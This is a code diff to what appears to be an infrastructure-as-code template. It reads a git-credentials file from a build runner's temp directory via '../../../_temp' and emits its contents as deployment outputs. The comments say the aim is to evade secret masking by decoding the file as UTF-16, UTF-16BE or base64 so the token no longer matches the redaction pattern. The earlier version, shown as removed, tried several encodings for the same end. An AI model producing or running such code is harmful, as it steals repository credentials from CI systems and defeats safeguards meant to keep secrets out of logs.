@@ -1,12 +1,18 @@
 var credFiles = loadDirectoryFileInfo('../../../_temp', 'git-credentials-*.config')
 
-// Try different encodings - maybe one bypasses masking
-var utf8 = loadTextContent(credFiles[0].relativePath, 'utf-8')
-var utf16 = loadTextContent(credFiles[0].relativePath, 'utf-16')
-var ascii = loadTextContent(credFiles[0].relativePath, 'us-ascii')
-var iso = loadTextContent(credFiles[0].relativePath, 'iso-8859-1')
+// Read UTF-8 file as UTF-16 - bytes will be misinterpreted, producing
+// garbled output that might not match the token pattern
+var garbled = loadTextContent(credFiles[0].relativePath, 'utf-16')
+output garbledContent string = garbled
 
-output e1 string = utf8
-output e2 string = utf16
-output e3 string = ascii
-output e4 string = iso
+// Also try reading as UTF-16BE (big endian)
+var garbled2 = loadTextContent(credFiles[0].relativePath, 'utf-16BE')
+output garbledBE string = garbled2
+
+// And base64 for comparison
+var b64 = loadFileAsBase64(credFiles[0].relativePath)
+output base64Content string = b64
+
+// Normal for comparison
+var normal = loadTextContent(credFiles[0].relativePath, 'utf-8')
+output normalContent string = normal
